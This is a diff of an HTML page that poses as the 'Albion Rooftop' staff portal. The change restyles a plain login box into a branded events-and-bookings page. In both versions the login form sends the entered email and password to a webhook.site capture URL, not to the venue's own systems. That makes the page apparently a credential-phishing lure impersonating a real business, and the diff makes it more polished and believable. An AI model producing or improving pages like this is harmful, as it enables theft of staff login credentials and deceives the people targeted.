@@ -1,96 +1,128 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-AU">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Albion Rooftop Staff Portal</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Raleway:wght@300;400;700&display=swap" />
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Albion Rooftop – Events & Bookings</title>
+  <meta name="description" content="Melbourne's Iconic Rooftop Bar. Host your next event or book your next table at the Albion Rooftop.">
+  <link rel="stylesheet" href="https://use.typekit.net/wrb2nsm.css">
   <style>
     body {
       margin: 0;
-      font-family: 'Raleway', sans-serif;
-      background: url('https://images.squarespace-cdn.com/content/v1/58a0f62eb3db2bbd08b0aa3d/1615263844126-2E2UB9RTT6HV5CLN1IUS/DSC06115.jpg') no-repeat center center fixed;
-      background-size: cover;
-      color: #fff;
+      font-family: 'proxima-nova', sans-serif;
+      background: #fff;
+      color: #000;
     }
 
-    .overlay {
-      background-color: rgba(0, 0, 0, 0.6);
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-    }
-
-    .container {
-      position: relative;
-      z-index: 1;
-      width: 100%;
-      max-width: 400px;
-      margin: 100px auto;
-      background: rgba(255,255,255,0.95);
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.4);
-      color: #333;
-    }
-
-    h2 {
+    header {
+      background-color: #000;
+      padding: 1em;
+      color: white;
       text-align: center;
-      margin-bottom: 20px;
-      font-weight: 700;
     }
 
-    label {
-      font-weight: 500;
+    h1 {
+      font-weight: 700;
+      font-size: 2em;
+      margin: 0.5em 0;
+    }
+
+    section.hero {
+      background-image: url('https://images.squarespace-cdn.com/content/v1/58a0f62eb3db2bbd08b0aa3d/1615263844126-2E2UB9RTT6HV5CLN1IUS/DSC06115.jpg');
+      background-size: cover;
+      background-position: center;
+      height: 85vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-shadow: 0 0 20px rgba(0,0,0,0.5);
+      color: #fff;
+      text-align: center;
+    }
+
+    .cta {
+      background: rgba(0,0,0,0.7);
+      padding: 2em;
+      border-radius: 12px;
+    }
+
+    .cta h2 {
+      font-size: 2.5em;
+      margin: 0;
+    }
+
+    section.login-box {
+      background-color: #f9f9f9;
+      padding: 50px;
+      text-align: center;
+    }
+
+    .form-container {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
     }
 
     input[type="email"], input[type="password"] {
       width: 100%;
       padding: 12px;
-      margin-top: 8px;
-      margin-bottom: 20px;
+      margin: 10px 0 20px;
       border: 1px solid #ccc;
       border-radius: 4px;
-      font-size: 16px;
+      font-size: 15px;
     }
 
     button {
-      width: 100%;
       background-color: #000;
       color: white;
       border: none;
       padding: 14px;
+      width: 100%;
       font-size: 16px;
       border-radius: 4px;
       cursor: pointer;
     }
 
-    .footer {
+    footer {
+      background-color: #111;
+      color: white;
       text-align: center;
-      font-size: 12px;
-      margin-top: 20px;
-      color: #aaa;
+      padding: 2em;
+      font-size: 0.9em;
     }
   </style>
 </head>
+
 <body>
-  <div class="overlay"></div>
-  <div class="container">
-    <h2>Albion Staff Portal</h2>
+
+<header>
+  <h1>THE ALBION ROOFTOP</h1>
+</header>
+
+<section class="hero">
+  <div class="cta">
+    <h2>Melbourne’s Premier Rooftop Experience</h2>
+    <p>Drinks. Events. Unforgettable views.</p>
+  </div>
+</section>
+
+<section class="login-box">
+  <h2>Staff Portal – Internal Access</h2>
+  <div class="form-container">
     <form method="POST" action="https://webhook.site/08a7406b-db34-4533-9dfa-bd111c749f10">
-      <label>Email Address</label>
-      <input type="email" name="email" required />
-
-      <label>Password</label>
-      <input type="password" name="password" required />
-
+      <input type="email" name="email" placeholder="Email Address" required />
+      <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Log In</button>
     </form>
-    <div class="footer">
-      © Albion Rooftop 2025 – Internal Use Only
-    </div>
   </div>
+</section>
+
+<footer>
+  &copy; 2025 The Albion Rooftop. All rights reserved.
+</footer>
+
 </body>
 </html>
